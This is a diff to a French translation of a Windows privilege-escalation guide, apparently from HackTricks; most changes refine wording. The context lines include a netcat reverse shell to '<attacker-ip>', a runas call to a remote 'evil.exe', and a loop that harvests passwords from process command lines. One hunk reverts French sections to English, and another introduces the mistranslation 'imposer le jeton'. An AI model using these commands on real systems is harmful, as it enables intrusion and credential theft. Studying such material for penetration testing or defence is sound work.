@@ -112,7 +112,7 @@ Stop-Transcript
 ```
 ### PowerShell Module Logging
 
-Les détails des exécutions de pipeline PowerShell sont enregistrés, englobant les commandes exécutées, les invocations de commandes et des parties de scripts. Cependant, les détails d'exécution complets et les résultats de sortie pourraient ne pas être capturés.
+Les détails des exécutions de pipeline PowerShell sont enregistrés, englobant les commandes exécutées, les invocations de commandes et des parties de scripts. Cependant, les détails d'exécution complets et les résultats de sortie peuvent ne pas être capturés.
 
 Pour activer cela, suivez les instructions dans la section "Fichiers de transcription" de la documentation, en choisissant **"Module Logging"** au lieu de **"Powershell Transcription"**.
 ```bash
@@ -210,7 +210,7 @@ Si vous avez une session meterpreter, vous pouvez automatiser cette technique en
 
 ### PowerUP
 
-Utilisez la commande `Write-UserAddMSI` de power-up pour créer dans le répertoire actuel un binaire MSI Windows pour élever les privilèges. Ce script génère un installateur MSI précompilé qui demande l'ajout d'un utilisateur/groupe (vous aurez donc besoin d'un accès GIU) :
+Utilisez la commande `Write-UserAddMSI` de power-up pour créer dans le répertoire actuel un binaire MSI Windows pour élever les privilèges. Ce script écrit un installateur MSI précompilé qui demande l'ajout d'un utilisateur/groupe (vous aurez donc besoin d'un accès GIU) :
 ```
 Write-UserAddMSI
 ```
@@ -358,9 +358,9 @@ powershell -command "Get-Clipboard"
 ```
 ## Exécution des processus
 
-### Permissions des fichiers et des dossiers
+### Permissions des fichiers et dossiers
 
-Tout d'abord, lister les processus **vérifie les mots de passe à l'intérieur de la ligne de commande du processus**.\
+Tout d'abord, lister les processus **vérifie la présence de mots de passe dans la ligne de commande du processus**.\
 Vérifiez si vous pouvez **écraser un binaire en cours d'exécution** ou si vous avez des permissions d'écriture dans le dossier binaire pour exploiter d'éventuelles [**attaques de détournement de DLL**](dll-hijacking/index.html):
 ```bash
 Tasklist /SVC #List processes running and services
@@ -435,7 +435,7 @@ accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 
 Si vous avez cette erreur (par exemple avec SSDPSRV) :
 
-_Une erreur système 1058 s'est produite._\
+_Erreur système 1058 s'est produite._\
 _Le service ne peut pas être démarré, soit parce qu'il est désactivé, soit parce qu'il n'a pas de périphériques activés qui lui sont associés._
 
 Vous pouvez l'activer en utilisant
@@ -517,7 +517,7 @@ appenddata-addsubdirectory-permission-over-service-registry.md
 
 ### Unquoted Service Paths
 
-Si le chemin vers un exécutable n'est pas entre guillemets, Windows essaiera d'exécuter chaque partie se terminant par un espace.
+Si le chemin vers un exécutable n'est pas entre guillemets, Windows essaiera d'exécuter chaque élément se terminant par un espace.
 
 Par exemple, pour le chemin _C:\Program Files\Some Folder\Service.exe_, Windows essaiera d'exécuter :
 ```powershell
@@ -570,7 +570,7 @@ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 
 Vérifiez si vous pouvez modifier un fichier de configuration pour lire un fichier spécial ou si vous pouvez modifier un binaire qui va être exécuté par un compte Administrateur (schedtasks).
 
-Une façon de trouver des permissions de dossier/fichier faibles dans le système est de faire :
+Une façon de trouver des permissions de dossiers/fichiers faibles dans le système est de faire :
 ```bash
 accesschk.exe /accepteula
 # Find all weak folder permissions per drive.
@@ -636,7 +636,7 @@ net share #Check current shares
 ```
 ### fichier hosts
 
-Vérifiez d'autres ordinateurs connus codés en dur dans le fichier hosts
+Vérifiez d'autres ordinateurs connus codés en dur dans le fichier hosts.
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
@@ -717,11 +717,11 @@ Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
 ```
-Ensuite, vous pouvez utiliser `runas` avec l'option `/savecred` afin d'utiliser les identifiants enregistrés. L'exemple suivant appelle un binaire distant via un partage SMB.
+Vous pouvez ensuite utiliser `runas` avec l'option `/savecred` afin d'utiliser les identifiants enregistrés. L'exemple suivant appelle un binaire distant via un partage SMB.
 ```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
-Utiliser `runas` avec un ensemble de credentials fournis.
+Utiliser `runas` avec un ensemble de credentials fourni.
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
@@ -731,7 +731,7 @@ Notez que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/
 
 L'**API de protection des données (DPAPI)** fournit une méthode pour le chiffrement symétrique des données, principalement utilisée au sein du système d'exploitation Windows pour le chiffrement symétrique des clés privées asymétriques. Ce chiffrement s'appuie sur un secret utilisateur ou système pour contribuer de manière significative à l'entropie.
 
-**DPAPI permet le chiffrement des clés à l'aide d'une clé symétrique dérivée des secrets de connexion de l'utilisateur**. Dans les scénarios impliquant le chiffrement système, elle utilise les secrets d'authentification de domaine du système.
+**DPAPI permet le chiffrement des clés à l'aide d'une clé symétrique dérivée des secrets de connexion de l'utilisateur**. Dans les scénarios impliquant le chiffrement système, il utilise les secrets d'authentification de domaine du système.
 
 Les clés RSA utilisateur chiffrées, en utilisant DPAPI, sont stockées dans le répertoire `%APPDATA%\Microsoft\Protect\{SID}`, où `{SID}` représente l'[Identifiant de sécurité](https://en.wikipedia.org/wiki/Security_Identifier) de l'utilisateur. **La clé DPAPI, co-localisée avec la clé maîtresse qui protège les clés privées de l'utilisateur dans le même fichier**, consiste généralement en 64 octets de données aléatoires. (Il est important de noter que l'accès à ce répertoire est restreint, empêchant l'affichage de son contenu via la commande `dir` dans CMD, bien qu'il puisse être listé via PowerShell).
 ```powershell
@@ -756,7 +756,7 @@ dpapi-extracting-passwords.md
 
 ### Identifiants PowerShell
 
-Les **identifiants PowerShell** sont souvent utilisés pour des tâches de **script** et d'automatisation comme moyen de stocker des identifiants chiffrés de manière pratique. Les identifiants sont protégés par **DPAPI**, ce qui signifie généralement qu'ils ne peuvent être déchiffrés que par le même utilisateur sur le même ordinateur où ils ont été créés.
+Les **identifiants PowerShell** sont souvent utilisés pour des **scripts** et des tâches d'automatisation comme moyen de stocker des identifiants chiffrés de manière pratique. Les identifiants sont protégés par **DPAPI**, ce qui signifie généralement qu'ils ne peuvent être déchiffrés que par le même utilisateur sur le même ordinateur où ils ont été créés.
 
 Pour **déchiffrer** un identifiant PS à partir du fichier qui le contient, vous pouvez faire :
 ```powershell
@@ -978,7 +978,7 @@ Recherchez un fichier appelé **SiteList.xml**
 
 ### Cached GPP Pasword
 
-Une fonctionnalité était auparavant disponible qui permettait le déploiement de comptes administrateurs locaux personnalisés sur un groupe de machines via les Préférences de stratégie de groupe (GPP). Cependant, cette méthode avait des failles de sécurité significatives. Premièrement, les Objets de stratégie de groupe (GPO), stockés sous forme de fichiers XML dans SYSVOL, pouvaient être accessibles par tout utilisateur de domaine. Deuxièmement, les mots de passe contenus dans ces GPP, chiffrés avec AES256 en utilisant une clé par défaut documentée publiquement, pouvaient être déchiffrés par tout utilisateur authentifié. Cela représentait un risque sérieux, car cela pouvait permettre aux utilisateurs d'obtenir des privilèges élevés.
+Une fonctionnalité était auparavant disponible qui permettait le déploiement de comptes administrateurs locaux personnalisés sur un groupe de machines via les Préférences de stratégie de groupe (GPP). Cependant, cette méthode présentait des failles de sécurité significatives. Premièrement, les Objets de stratégie de groupe (GPO), stockés sous forme de fichiers XML dans SYSVOL, pouvaient être accessibles par tout utilisateur de domaine. Deuxièmement, les mots de passe contenus dans ces GPP, chiffrés avec AES256 en utilisant une clé par défaut documentée publiquement, pouvaient être déchiffrés par tout utilisateur authentifié. Cela représentait un risque sérieux, car cela pouvait permettre aux utilisateurs d'obtenir des privilèges élevés.
 
 Pour atténuer ce risque, une fonction a été développée pour scanner les fichiers GPP mis en cache localement contenant un champ "cpassword" qui n'est pas vide. Lorsqu'un tel fichier est trouvé, la fonction déchiffre le mot de passe et renvoie un objet PowerShell personnalisé. Cet objet inclut des détails sur le GPP et l'emplacement du fichier, aidant à l'identification et à la remédiation de cette vulnérabilité de sécurité.
 
@@ -1176,7 +1176,7 @@ Les classes et interfaces COM sont définies dans le registre sous **HKEY\_**_**
 
 ![](<../../images/image (729).png>)
 
-En gros, si vous pouvez **écraser l'une des DLL** qui vont être exécutées, vous pourriez **escalader les privilèges** si cette DLL doit être exécutée par un utilisateur différent.
+En gros, si vous pouvez **écraser l'une des DLL** qui vont être exécutées, vous pourriez **escalader les privilèges** si cette DLL doit être exécutée par un autre utilisateur.
 
 Pour apprendre comment les attaquants utilisent le détournement COM comme mécanisme de persistance, consultez :
 
@@ -1220,26 +1220,26 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 ## Leaked Handlers
 
-Imaginez qu'**un processus s'exécutant en tant que SYSTEM ouvre un nouveau processus** (`OpenProcess()`) avec **un accès complet**. Le même processus **crée également un nouveau processus** (`CreateProcess()`) **avec des privilèges faibles mais héritant de tous les handles ouverts du processus principal**.\
-Ensuite, si vous avez **un accès complet au processus à faibles privilèges**, vous pouvez saisir le **handle ouvert au processus privilégié créé** avec `OpenProcess()` et **injecter un shellcode**.\
-[Lire cet exemple pour plus d'informations sur **comment détecter et exploiter cette vulnérabilité**.](leaked-handle-exploitation.md)\
-[Lire ce **autre article pour une explication plus complète sur comment tester et abuser de plus de handles ouverts de processus et de threads hérités avec différents niveaux de permissions (pas seulement un accès complet)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
+Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
+Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
+[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
+[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
 ## Named Pipe Client Impersonation
 
-Les segments de mémoire partagée, appelés **pipes**, permettent la communication entre processus et le transfert de données.
+Shared memory segments, referred to as **pipes**, enable process communication and data transfer.
 
-Windows fournit une fonctionnalité appelée **Named Pipes**, permettant à des processus non liés de partager des données, même sur des réseaux différents. Cela ressemble à une architecture client/serveur, avec des rôles définis comme **serveur de pipe nommé** et **client de pipe nommé**.
+Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.
 
-Lorsque des données sont envoyées par un **client** à travers un pipe, le **serveur** qui a configuré le pipe a la capacité de **prendre l'identité** du **client**, à condition qu'il dispose des droits nécessaires **SeImpersonate**. Identifier un **processus privilégié** qui communique via un pipe que vous pouvez imiter offre une opportunité de **gagner des privilèges plus élevés** en adoptant l'identité de ce processus une fois qu'il interagit avec le pipe que vous avez établi. Pour des instructions sur l'exécution d'une telle attaque, des guides utiles peuvent être trouvés [**ici**](named-pipe-client-impersonation.md) et [**ici**](#from-high-integrity-to-system).
+When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).
 
-De plus, l'outil suivant permet de **intercepter une communication de pipe nommé avec un outil comme burp :** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **et cet outil permet de lister et de voir tous les pipes pour trouver des privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
 ## Misc
 
 ### **Monitoring Command Lines for passwords**
 
-Lorsqu'on obtient un shell en tant qu'utilisateur, il peut y avoir des tâches planifiées ou d'autres processus en cours d'exécution qui **passent des identifiants sur la ligne de commande**. Le script ci-dessous capture les lignes de commande des processus toutes les deux secondes et compare l'état actuel avec l'état précédent, affichant les différences.
+When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
 ```powershell
 while($true)
 {
@@ -1301,7 +1301,7 @@ Vous avez tous les fichiers et informations nécessaires dans le dépôt GitHub 
 
 https://github.com/jas502n/CVE-2019-1388
 
-## De l'administrateur au niveau d'intégrité élevé / Contournement de l'UAC
+## De l'administrateur à un niveau d'intégrité élevé / Contournement de l'UAC
 
 Lisez ceci pour **en savoir plus sur les niveaux d'intégrité** :
 
@@ -1327,7 +1327,7 @@ sc start newservicename
 ### AlwaysInstallElevated
 
 Depuis un processus à haute intégrité, vous pourriez essayer d'**activer les entrées de registre AlwaysInstallElevated** et **installer** un reverse shell en utilisant un _**.msi**_ wrapper.\
-[Plus d'informations sur les clés de registre impliquées et comment installer un _.msi_ package ici.](#alwaysinstallelevated)
+[Plus d'informations sur les clés de registre impliquées et comment installer un paquet _.msi_ ici.](#alwaysinstallelevated)
 
 ### High + SeImpersonate privilege to System
 
@@ -1335,19 +1335,19 @@ Depuis un processus à haute intégrité, vous pourriez essayer d'**activer les 
 
 ### From SeDebug + SeImpersonate to Full Token privileges
 
-Si vous avez ces privilèges de jeton (vous les trouverez probablement dans un processus à haute intégrité déjà), vous pourrez **ouvrir presque n'importe quel processus** (pas de processus protégés) avec le privilège SeDebug, **copier le jeton** du processus, et créer un **processus arbitraire avec ce jeton**.\
+Si vous avez ces privilèges de jeton (vous les trouverez probablement dans un processus déjà à haute intégrité), vous pourrez **ouvrir presque n'importe quel processus** (pas de processus protégés) avec le privilège SeDebug, **copier le jeton** du processus, et créer un **processus arbitraire avec ce jeton**.\
 Utiliser cette technique consiste généralement à **sélectionner n'importe quel processus s'exécutant en tant que SYSTEM avec tous les privilèges de jeton** (_oui, vous pouvez trouver des processus SYSTEM sans tous les privilèges de jeton_).\
 **Vous pouvez trouver un** [**exemple de code exécutant la technique proposée ici**](sedebug-+-seimpersonate-copy-token.md)**.**
 
 ### **Named Pipes**
 
-Cette technique est utilisée par meterpreter pour escalader dans `getsystem`. La technique consiste à **créer un pipe puis créer/abuser un service pour écrire sur ce pipe**. Ensuite, le **serveur** qui a créé le pipe en utilisant le privilège **`SeImpersonate`** pourra **imiter le jeton** du client du pipe (le service) obtenant des privilèges SYSTEM.\
+Cette technique est utilisée par meterpreter pour s'élever dans `getsystem`. La technique consiste à **créer un pipe puis créer/abuser un service pour écrire sur ce pipe**. Ensuite, le **serveur** qui a créé le pipe en utilisant le privilège **`SeImpersonate`** pourra **imposer le jeton** du client du pipe (le service) obtenant des privilèges SYSTEM.\
 Si vous voulez [**en savoir plus sur les pipes nommés, vous devriez lire ceci**](#named-pipe-client-impersonation).\
 Si vous voulez lire un exemple de [**comment passer d'une haute intégrité à System en utilisant des pipes nommés, vous devriez lire ceci**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
 
-Si vous parvenez à **détourner une dll** étant **chargée** par un **processus** s'exécutant en tant que **SYSTEM**, vous pourrez exécuter du code arbitraire avec ces permissions. Par conséquent, le Dll Hijacking est également utile pour ce type d'escalade de privilèges, et, de plus, il est **beaucoup plus facile à réaliser depuis un processus à haute intégrité** car il aura **des permissions d'écriture** sur les dossiers utilisés pour charger des dlls.\
+Si vous parvenez à **détourner une dll** étant **chargée** par un **processus** s'exécutant en tant que **SYSTEM**, vous pourrez exécuter du code arbitraire avec ces permissions. Par conséquent, le Dll Hijacking est également utile pour ce type d'escalade de privilèges, et, de plus, il est **beaucoup plus facile à réaliser depuis un processus à haute intégrité** car il aura **des permissions d'écriture** sur les dossiers utilisés pour charger les dll.\
 **Vous pouvez** [**en savoir plus sur le Dll hijacking ici**](dll-hijacking/index.html)**.**
 
 ### **From Administrator or Network Service to System**
